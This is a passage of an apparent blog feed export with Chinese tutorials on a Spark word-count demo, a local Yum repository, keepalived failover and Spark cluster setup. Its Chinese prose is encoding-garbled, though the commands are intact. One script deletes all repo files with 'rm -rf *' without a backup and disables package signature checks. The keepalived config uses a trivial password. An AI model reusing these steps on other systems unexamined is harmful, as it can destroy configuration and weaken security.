src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617111038031-1027adcb-4913-4915-bce0-e22077e55f2d.png#height=569&amp;id=WdZdI&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=755&amp;originWidth=802&amp;originalType=binary%E2%88%B6=1&amp;size=51795&amp;status=done&amp;style=none&amp;width=604" alt="image.png"></p><ol start="4"><li>é€‰æ‹© <em>æ–‡ä»¶-&gt;é¡¹ç›®ç»“æ„</em></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617111384980-ea83705f-84b3-4412-a518-0ed09d4196a6.png#height=526&amp;id=nDft8&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=712&amp;originWidth=844&amp;originalType=binary%E2%88%B6=1&amp;size=54164&amp;status=done&amp;style=none&amp;width=623" alt="image.png"></p><ol start="5"><li>é€‰æ‹© JAVA</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617111415011-59c36091-99bd-42fe-bf7c-c96f676a791d.png#height=168&amp;id=wvPTD&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=168&amp;originWidth=205&amp;originalType=binary%E2%88%B6=1&amp;size=12116&amp;status=done&amp;style=none&amp;width=205" alt="image.png"></p><ol start="6"><li>é€‰æ‹© spark ç›®å½•ä¸‹çš„ jars</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617111467084-a8cfc6cd-cf07-4c75-8848-d13d83008146.png#height=458&amp;id=aOx0S&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=484&amp;originWidth=748&amp;originalType=binary%E2%88%B6=1&amp;size=76416&amp;status=done&amp;style=none&amp;width=708" alt="image.png"></p><h2 id="ä¸‰ã€ç¨‹åºç¼–å†™"><a href="#ä¸‰ã€ç¨‹åºç¼–å†™" class="headerlink" title="ä¸‰ã€ç¨‹åºç¼–å†™"></a>ä¸‰ã€ç¨‹åºç¼–å†™</h2><p>è¯é¢‘ç»Ÿè®¡ Demoï¼š</p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">package</span> org<span class="token punctuation">.</span>spark<span class="token punctuation">.</span>demo<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>spark<span class="token punctuation">.</span><span class="token punctuation">{</span>SparkConf<span class="token punctuation">,</span> SparkContext<span class="token punctuation">}</span><span class="token keyword">object</span> Demo <span class="token punctuation">{</span>  <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Unit</span> <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Create a SparkContext to initialize Spark</span>    <span class="token keyword">val</span> conf <span class="token operator">=</span> <span class="token keyword">new</span> SparkConf<span class="token punctuation">(</span><span class="token punctuation">)</span>    conf<span class="token punctuation">.</span>setMaster<span class="token punctuation">(</span><span class="token string">"local"</span><span class="token punctuation">)</span>    conf<span class="token punctuation">.</span>setAppName<span class="token punctuation">(</span><span class="token string">"Word Count"</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> sc <span class="token operator">=</span> <span class="token keyword">new</span> SparkContext<span class="token punctuation">(</span>conf<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// Load the text into a Spark RDD, which is a distributed representation of each line of text</span>    <span class="token keyword">val</span> textFile <span class="token operator">=</span> sc<span class="token punctuation">.</span>textFile<span class="token punctuation">(</span><span class="token string">"file:///simple/test.txt"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// word count</span>    <span class="token keyword">val</span> counts <span class="token operator">=</span> textFile<span class="token punctuation">.</span>flatMap<span class="token punctuation">(</span>line <span class="token keyword">=></span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span>map<span class="token punctuation">(</span>word <span class="token keyword">=></span> <span class="token punctuation">(</span>word<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span>reduceByKey<span class="token punctuation">(</span>_ <span class="token operator">+</span> _<span class="token punctuation">)</span>    counts<span class="token punctuation">.</span>foreach<span class="token punctuation">(</span>println<span class="token punctuation">)</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span>println<span class="token punctuation">(</span><span class="token string">"Total words: "</span> <span class="token operator">+</span> counts<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    counts<span class="token punctuation">.</span>saveAsTextFile<span class="token punctuation">(</span><span class="token string">"/tmp/shakespeareWordCount"</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å››ã€æ„å»ºæ‰“åŒ…ï¼Œæäº¤åˆ°-spark-ç¯å¢ƒè¿è¡Œ"><a href="#å››ã€æ„å»ºæ‰“åŒ…ï¼Œæäº¤åˆ°-spark-ç¯å¢ƒè¿è¡Œ" class="headerlink" title="å››ã€æ„å»ºæ‰“åŒ…ï¼Œæäº¤åˆ° spark ç¯å¢ƒè¿è¡Œ"></a>å››ã€æ„å»ºæ‰“åŒ…ï¼Œæäº¤åˆ° spark ç¯å¢ƒè¿è¡Œ</h2><ol><li>é€‰æ‹© _æ–‡ä»¶-&gt;é¡¹ç›®ç»“æ„_ï¼Œç„¶åï¼š</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617111940864-2c015aeb-6abe-4ad2-a8a6-8a3c9455d915.png#height=376&amp;id=FZk8W&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=424&amp;originWidth=598&amp;originalType=binary%E2%88%B6=1&amp;size=67247&amp;status=done&amp;style=none&amp;width=530" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617111855487-a6a47121-fe59-45b1-b647-431855af312e.png#height=410&amp;id=CkJm8&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=410&amp;originWidth=532&amp;originalType=binary%E2%88%B6=1&amp;size=46282&amp;status=done&amp;style=none&amp;width=532" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617112163745-dd32818d-3ccb-4c6a-a13f-865ec2e964ef.png#height=244&amp;id=T286k&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=244&amp;originWidth=331&amp;originalType=binary%E2%88%B6=1&amp;size=48768&amp;status=done&amp;style=none&amp;width=331" alt="image.png"></p><ol start="2"><li>ç”Ÿæˆ JAR åŒ…è·¯å¾„ï¼šout/artifacts/DemoProject_jar/DemoProject.jar</li><li>å°† JAR åŒ…ä¸Šä¼ è‡³ Spark é›†ç¾¤ï¼Œæ‰§è¡Œï¼š</li></ol><pre class="line-numbers language-bash"><code class="language-bash">spark-submit --class org.spark.demo.Demo /root/jars/DemoProject.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Spark </tag>
            
            <tag> å¼€å‘ </tag>
            
            <tag> Scala </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RedHaté…ç½®æœ¬åœ°Yumæº</title>
      <link href="/post/9f4704e8.html"/>
      <url>/post/9f4704e8.html</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€é…ç½®æ–¹æ³•"><a href="#ä¸€ã€é…ç½®æ–¹æ³•" class="headerlink" title="ä¸€ã€é…ç½®æ–¹æ³•"></a>ä¸€ã€é…ç½®æ–¹æ³•</h2><ol><li>Yum é…ç½®æ–‡ä»¶å­˜æ”¾è·¯å¾„</li></ol><p><strong>/etc/yum.repos.d/*.repo</strong><br><strong><em>â€‹</em></strong></p><ol start="2"><li>å¤‡ä»½é…ç½®æ–‡ä»¶</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /etc/yum.repos.d/<span class="token function">mkdir</span> repo_bak<span class="token function">mv</span> *.repo repo_bak/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="3"><li>åœ¨è¯¥ç›®å½•ä¸‹æ·»åŠ é…ç½®æ–‡ä»¶</li></ol><p><strong>local.repo</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>c8-media-AppStream<span class="token punctuation">]</span>name<span class="token operator">=</span>AppStreambaseurl<span class="token operator">=</span>file:///mnt/cdrom/AppStreamgpgcheck<span class="token operator">=</span>0enabled<span class="token operator">=</span>1<span class="token punctuation">[</span>c8-media-BaseOS<span class="token punctuation">]</span>name<span class="token operator">=</span>BaseOSbaseurl<span class="token operator">=</span>file:///mnt/cdrom/BaseOSgpgcheck<span class="token operator">=</span>0enabled<span class="token operator">=</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>è¿æ¥ ISO ç³»ç»Ÿé•œåƒçš„ CD/DVD</li></ol><p>â€‹</p><ol start="5"><li>åˆ›å»ºæ–‡ä»¶å¤¹</li></ol><p><strong>mkdir /mnt/cdrom</strong><br><strong><em>â€‹</em></strong></p><ol start="6"><li>æŒ‚è½½é•œåƒ</li></ol><p><strong>mount /dev/sr0 /mnt/cdrom</strong><br><strong><em>â€‹</em></strong></p><ol start="7"><li>æ¸…ç©ºé‡å»º cache</li></ol><pre class="line-numbers language-bash"><code class="language-bash">yum clean allyum makecache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="8"><li>å¼€æœºè‡ªåŠ¨æŒ‚è½½(ä¸æ¨è)</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"/dev/sr0 /mnt/cdrom iso9660 defaults 0 0"</span> <span class="token operator">>></span> /etc/fstab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="äºŒã€è‡ªåŠ¨é…ç½®è„šæœ¬"><a href="#äºŒã€è‡ªåŠ¨é…ç½®è„šæœ¬" class="headerlink" title="äºŒã€è‡ªåŠ¨é…ç½®è„šæœ¬"></a>äºŒã€è‡ªåŠ¨é…ç½®è„šæœ¬</h2><p>ç¼–è¾‘è„šæœ¬æ–‡ä»¶ï¼šyum.sh</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># è‡ªåŠ¨é…ç½®æœ¬åœ°yumæº</span><span class="token comment" spellcheck="true"># éœ€è¦å…ˆæŒ‚è½½ğŸ’¿å…‰ç›˜é•œåƒISO</span><span class="token function">cd</span> /etc/yum.repos.d <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -rf  *<span class="token function">cat</span> <span class="token operator">></span>rhel7.repo<span class="token operator">&lt;&lt;</span><span class="token string">EOF[rhel7]name=rhel7baseurl=file:///media/cdromenabled=1gpgcheck=0EOF</span><span class="token function">mkdir</span> -p /media/cdrom<span class="token function">mount</span> /dev/cdrom /media/cdrom<span class="token keyword">echo</span> <span class="token string">"/dev/cdrom /media/cdrom iso9660 defaults 0 0"</span> <span class="token operator">>></span> /etc/fstabyum clean allyum makecache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡Œè„šæœ¬</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chmod</span> 755 yum.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> äº‘è®¡ç®— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> è¿ç»´ </tag>
            
            <tag> Yum </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>keepalivedé…ç½®</title>
      <link href="/post/77447fe2.html"/>
      <url>/post/77447fe2.html</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€åŸºæœ¬ä¿¡æ¯"><a href="#ä¸€ã€åŸºæœ¬ä¿¡æ¯" class="headerlink" title="ä¸€ã€åŸºæœ¬ä¿¡æ¯"></a>ä¸€ã€åŸºæœ¬ä¿¡æ¯</h2><p>ä»£ç†ä¸»æœº 01ï¼š<strong>192.168.198.99</strong><br>ä»£ç†ä¸»æœº 02ï¼š<strong>192.168.198.98</strong><br>è™šæ‹Ÿ IPï¼š<strong>192.168.198.88</strong><br>ç½‘å¡ï¼š<strong>ens33</strong></p><h2 id="äºŒã€é…ç½®æ–‡ä»¶"><a href="#äºŒã€é…ç½®æ–‡ä»¶" class="headerlink" title="äºŒã€é…ç½®æ–‡ä»¶"></a>äºŒã€é…ç½®æ–‡ä»¶</h2><h3 id="1-etc-hosts"><a href="#1-etc-hosts" class="headerlink" title="1. /etc/hosts"></a>1. /etc/hosts</h3><pre class="line-numbers language-basic"><code class="language-basic"><span class="token number">192.168</span><span class="token number">.198.99</span> proxy<span class="token operator">-</span><span class="token number">1</span><span class="token number">192.168</span><span class="token number">.198.98</span> proxy<span class="token operator">-</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-etc-keepalived-keepalived-conf"><a href="#2-etc-keepalived-keepalived-conf" class="headerlink" title="2. /etc/keepalived/keepalived.conf"></a>2. /etc/keepalived/keepalived.conf</h3><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token operator">!</span> Configuration File for keepalivedglobal_defs <span class="token punctuation">{</span>   notification_email <span class="token punctuation">{</span>        chenhaikun8@gmail<span class="token punctuation">.</span>com   <span class="token punctuation">}</span>   notification_email_from keepalived@vmware<span class="token punctuation">.</span>com   smtp_server <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span>   router_id <span class="token keyword">proxy</span><span class="token operator">-</span><span class="token number">1</span>   vrrp_mcast_group4 <span class="token number">224.4</span><span class="token punctuation">.</span><span class="token number">4.4</span><span class="token punctuation">}</span>vrrp_script chk_proxy <span class="token punctuation">{</span>    script <span class="token string">"/etc/keepalived/proxy_check.sh"</span>    interval <span class="token number">2</span>    weight <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">}</span>vrrp_instance VI_1 <span class="token punctuation">{</span>    state BACKUP    nopreempt    interface <span class="token class-name">ens33</span>    virtual_router_id <span class="token number">11</span>    priority <span class="token number">100</span>    advert_int <span class="token number">1</span>    authentication <span class="token punctuation">{</span>        auth_type PASS        auth_pass <span class="token number">1111</span>    <span class="token punctuation">}</span>    virtual_ipaddress <span class="token punctuation">{</span>        <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">198.88</span><span class="token operator">/</span><span class="token number">24</span> dev ens33 label ens33<span class="token punctuation">:</span><span class="token number">1</span>    <span class="token punctuation">}</span>    track_script <span class="token punctuation">{</span>        chk_proxy    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-etc-keepalived-proxy-check-sh"><a href="#3-etc-keepalived-proxy-check-sh" class="headerlink" title="3. /etc/keepalived/proxy_check.sh"></a>3. /etc/keepalived/proxy_check.sh</h3><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token comment" spellcheck="true">#!/bin/bash</span><span class="token comment" spellcheck="true"># === nginx prxy check script ===</span>netstat <span class="token operator">-</span>nlpt <span class="token operator">|</span> grep <span class="token operator">-</span>w <span class="token string">"80"</span> <span class="token operator">&amp;</span><span class="token operator">></span><span class="token operator">></span> <span class="token operator">/</span>dev<span class="token operator">/</span>null<span class="token keyword">if</span> <span class="token punctuation">[</span> $<span class="token operator">?</span> <span class="token operator">-</span>ne <span class="token number">0</span> <span class="token punctuation">]</span>then    systemctl stop keepalivedfi    exit <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> äº‘è®¡ç®— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> è¿ç»´ </tag>
            
            <tag> é«˜å¯ç”¨ </tag>
            
            <tag> keepalived </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sparké›†ç¾¤éƒ¨ç½²</title>
      <link href="/post/6b5ff5c0.html"/>
      <url>/post/6b5ff5c0.html</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€é›†ç¾¤æ¶æ„"><a href="#ä¸€ã€é›†ç¾¤æ¶æ„" class="headerlink" title="ä¸€ã€é›†ç¾¤æ¶æ„"></a>ä¸€ã€é›†ç¾¤æ¶æ„</h2><p>éƒ¨ç½²ç³»ç»Ÿæ˜¯ç¬¬ä¸€ä»¶äº‹ï¼Œé‚£ä¹ˆç³»ç»Ÿéƒ¨ç½²æˆåŠŸä»¥åï¼Œå„ä¸ªèŠ‚ç‚¹éƒ½å¯åŠ¨äº†å“ªäº›æœåŠ¡ï¼ŸæœåŠ¡ä¹‹é—´çš„å…³è”æ˜¯ä»€ä¹ˆï¼ŒæœåŠ¡ä¹‹é—´çš„é…åˆæ˜¯æ€æ ·çš„ï¼Ÿ<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1616416690501-97eccfeb-66e8-47ed-a11b-cdc420cdc549.png#height=2374&amp;id=p61MG&amp;originHeight=2374&amp;originWidth=3012&amp;originalType=binary%E2%88%B6=1&amp;size=0&amp;status=done&amp;style=none&amp;width=3012"></p><h2 id="äºŒã€ä¸»æœºè®¾ç½®"><a href="#äºŒã€ä¸»æœºè®¾ç½®" class="headerlink" title="äºŒã€ä¸»æœºè®¾ç½®"></a>äºŒã€ä¸»æœºè®¾ç½®</h2><h3 id="1-ä¸»æœºä¿¡æ¯"><a href="#1-ä¸»æœºä¿¡æ¯" class="headerlink" title="1. ä¸»æœºä¿¡æ¯"></a>1. ä¸»æœºä¿¡æ¯</h3><table><thead><tr><th><strong>Host</strong></th><th><strong>hostname</strong></th><th><strong>Type</strong></th></tr></thead><tbody><tr><td>192.168.2.20</td><td>spark0</td><td>Master</td></tr><tr><td>192.168.2.21</td><td>spark1</td><td>Worker</td></tr><tr><td>192.168.2.22</td><td>spark2</td><td>Worker</td></tr><tr><td>192.168.2.23</td><td>spark3</td><td>Worker</td></tr></tbody></table><h3 id="2-ç½‘ç»œé…ç½®-è®¾ç½®é™æ€-IP"><a href="#2-ç½‘ç»œé…ç½®-è®¾ç½®é™æ€-IP" class="headerlink" title="2. ç½‘ç»œé…ç½®-è®¾ç½®é™æ€ IP"></a>2. ç½‘ç»œé…ç½®-è®¾ç½®é™æ€ IP</h3><p>Centosï¼š**/etc/sysconfig/network-scripts/ifcfg-ens3**</p><pre class="line-numbers language-bash"><code class="language-bash">TYPE<span class="token operator">=</span>EthernetPROXY_METHOD<span class="token operator">=</span>noneBROWSER_ONLY<span class="token operator">=</span>noBOOTPROTO<span class="token operator">=</span>static            <span class="token comment" spellcheck="true"># é™æ€IP</span>DEFROUTE<span class="token operator">=</span>yesIPV4_FAILURE_FATAL<span class="token operator">=</span>noIPV6INIT<span class="token operator">=</span>yesIPV6_AUTOCONF<span class="token operator">=</span>yesIPV6_DEFROUTE<span class="token operator">=</span>yesIPV6_FAILURE_FATAL<span class="token operator">=</span>noIPV6_ADDR_GEN_MODE<span class="token operator">=</span>stable-privacyNAME<span class="token operator">=</span>ens33UUID<span class="token operator">=</span>0be22931-2f93-49ba-a410-6d366009dd1eDEVICE<span class="token operator">=</span>ens33ONBOOT<span class="token operator">=</span>yesIPADDR<span class="token operator">=</span>192.168.2.20          <span class="token comment" spellcheck="true"># è®¾ç½®IPåœ°å€</span>NETMASK<span class="token operator">=</span>255.255.255.0        <span class="token comment" spellcheck="true"># è®¾ç½®å­ç½‘æ©ç </span>GATEWAY<span class="token operator">=</span>192.168.2.2          <span class="token comment" spellcheck="true"># è®¾ç½®ç½‘å…³</span>DNS1<span class="token operator">=</span>192.168.2.2             <span class="token comment" spellcheck="true"># è®¾ç½®dns1</span>DNS2<span class="token operator">=</span>114.114.114.114         <span class="token comment" spellcheck="true"># è®¾ç½®dns2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-è®¾ç½®-hostname"><a href="#3-è®¾ç½®-hostname" class="headerlink" title="3. è®¾ç½® hostname"></a>3. è®¾ç½® hostname</h3><pre class="line-numbers language-bash"><code class="language-bash">hostnamectl set-hostname sparkN<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-è®¾ç½®-hosts"><a href="#4-è®¾ç½®-hosts" class="headerlink" title="4. è®¾ç½® hosts"></a>4. è®¾ç½® hosts</h3><p>åœ¨ 4 å°ä¸»æœºä¸Šåˆ†åˆ«ä¿®æ”¹ <strong>/etc/hosts</strong> ï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹</p><pre class="line-numbers language-bash"><code class="language-bash">192.168.2.20 spark0192.168.2.21 spark1192.168.2.22 spark2192.168.2.23 spark3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æµ‹è¯•</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ping</span> spark1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-å…¬é’¥ç§é’¥é…ç½®"><a href="#5-å…¬é’¥ç§é’¥é…ç½®" class="headerlink" title="5. å…¬é’¥ç§é’¥é…ç½®"></a>5. å…¬é’¥ç§é’¥é…ç½®</h3><p>åœ¨æ¯å°ä¸»æœºä¸Šäº§ç”Ÿæ–°çš„<strong>rsa å…¬é’¥ç§é’¥</strong>æ–‡ä»¶ï¼Œå¹¶ç»Ÿä¸€æ‹·è´åˆ°ä¸€ä¸ª<strong>authorized_keys</strong>æ–‡ä»¶ä¸­<br>ï¼ˆ1ï¼‰ç™»å½•<strong>spark0</strong>ï¼Œè¾“å…¥å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">ssh-keygen -t rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>ä¸‰æ¬¡å›è½¦åï¼Œ**.ssh<strong>ç›®å½•ä¸‹å°†ä¼šäº§ç”Ÿ</strong>id_rsa<strong>ï¼Œ</strong>id_rsa.pub<strong>æ–‡ä»¶ï¼Œ</strong>å…¶ä»–ä¸»æœº**ä¹Ÿä½¿ç”¨è¯¥æ–¹å¼äº§ç”Ÿå¯†é’¥æ–‡ä»¶ã€‚</p></blockquote><p>ï¼ˆ2ï¼‰ç™»å½•<strong>spark0</strong>ï¼Œè¾“å…¥å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> .ssh<span class="token function">cat</span> id_rsa.pub <span class="token operator">>></span> authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>å°†<strong>id_rsa.pub</strong>å…¬é’¥å†…å®¹æ‹·è´åˆ°<strong>authorized_keys</strong>æ–‡ä»¶ä¸­</p></blockquote><p>ï¼ˆ3ï¼‰ç™»å½•å…¶å®ƒä¸»æœºï¼Œå°†å…¶å®ƒä¸»æœºçš„å…¬é’¥æ–‡ä»¶å†…å®¹éƒ½æ‹·è´åˆ°<strong>spark0</strong>ä¸»æœºä¸Šçš„<strong>authorized_keys</strong>æ–‡ä»¶ä¸­ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># ç™»å½•spark1ï¼Œå°†å…¬é’¥æ‹·è´åˆ°spark0çš„authorized_keysä¸­</span>ssh-copy-id -i spark0<span class="token comment" spellcheck="true"># ç™»å½•spark2ï¼Œå°†å…¬é’¥æ‹·è´åˆ°spark0çš„authorized_keysä¸­</span>ssh-copy-id -i spark0<span class="token comment" spellcheck="true"># ç™»å½•spark3ï¼Œå°†å…¬é’¥æ‹·è´åˆ°spark0çš„authorized_keysä¸­</span>ssh-copy-id -i spark0<span class="token comment" spellcheck="true"># ç™»å½•spark0ï¼ŒæŸ¥çœ‹authorized_keysæ˜¯å¦æˆåŠŸ</span><span class="token function">cd</span> .ssh <span class="token operator">&amp;</span> <span class="token function">cat</span> authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-æˆæƒ-authorized-keys-æ–‡ä»¶"><a href="#6-æˆæƒ-authorized-keys-æ–‡ä»¶" class="headerlink" title="6. æˆæƒ authorized_keys æ–‡ä»¶"></a>6. æˆæƒ authorized_keys æ–‡ä»¶</h3><p>ï¼ˆ1ï¼‰ç™»å½•<strong>spark0</strong>ï¼Œè¾“å…¥å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> .ssh<span class="token function">chmod</span> 600 authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="7-å°†æˆæƒæ–‡ä»¶åˆ†å‘åˆ°å…¶ä»–ä¸»æœºä¸Š"><a href="#7-å°†æˆæƒæ–‡ä»¶åˆ†å‘åˆ°å…¶ä»–ä¸»æœºä¸Š" class="headerlink" title="7. å°†æˆæƒæ–‡ä»¶åˆ†å‘åˆ°å…¶ä»–ä¸»æœºä¸Š"></a>7. å°†æˆæƒæ–‡ä»¶åˆ†å‘åˆ°å…¶ä»–ä¸»æœºä¸Š</h3><p>ï¼ˆ1ï¼‰ç™»å½• spark0ï¼Œå°†æˆæƒæ–‡ä»¶æ‹·è´åˆ° spark1ã€spark2â€¦ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># æ‹·è´åˆ°spark1ä¸Š</span><span class="token function">scp</span> /root/.ssh/authorized_keys spark1:/root/.ssh/<span class="token comment" spellcheck="true"># æ‹·è´åˆ°spark2ä¸Š</span><span class="token function">scp</span> /root/.ssh/authorized_keys spark2:/root/.ssh/<span class="token comment" spellcheck="true"># æ‹·è´åˆ°spark3ä¸Š</span><span class="token function">scp</span> /root/.ssh/authorized_keys spark3:/root/.ssh/<span class="token comment" spellcheck="true"># æµ‹è¯•</span><span class="token function">ssh</span> spark1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ä¸‰ã€ç¯å¢ƒå®‰è£…é…ç½®ï¼ˆåœ¨-spark0-ä¸Šæ“ä½œï¼‰"><a href="#ä¸‰ã€ç¯å¢ƒå®‰è£…é…ç½®ï¼ˆåœ¨-spark0-ä¸Šæ“ä½œï¼‰" class="headerlink" title="ä¸‰ã€ç¯å¢ƒå®‰è£…é…ç½®ï¼ˆåœ¨ spark0 ä¸Šæ“ä½œï¼‰"></a>ä¸‰ã€ç¯å¢ƒå®‰è£…é…ç½®ï¼ˆåœ¨ spark0 ä¸Šæ“ä½œï¼‰</h2><h3 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h3><ol><li>Downlaod JDK</li></ol><p>ä¸‹è½½åœ°å€ï¼š<a href="https://www.yuque.com/attachments/yuque/0/2021/zip/519483/1616420001017-86504c38-9976-4947-857a-ab4d9d2d0028.zip?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/zip/519483/1616420001017-86504c38-9976-4947-857a-ab4d9d2d0028.zip%22,%22name%22:%22jdk-8u281-linux-x64.tar.gz.zip%22,%22size%22:143049315,%22type%22:%22%22,%22ext%22:%22zip%22,%22status%22:%22done%22,%22source%22:%22transfer%22,%22id%22:%22ZVZP4%22,%22card%22:%22file%22%7D">jdk-8u281-linux-x64.tar.gz.zip</a></p><ol start="2"><li>è§£å‹ JDKâ€‹</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -zxvf jdk-8u281-linux-x64.tar.gz -C /opt/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>é…ç½®ç¯å¢ƒå˜é‡</li></ol><p>ç¼–è¾‘**/etc/profile**ï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> JAVA_HOME<span class="token operator">=</span>/opt/jdk1.8.0_281<span class="token function">export</span> JRE_HOME<span class="token operator">=</span><span class="token variable">$JAVA_HOME</span>/jre<span class="token function">export</span> CLASSPATH<span class="token operator">=</span>.:<span class="token variable">$JAVA_HOME</span>/lib:<span class="token 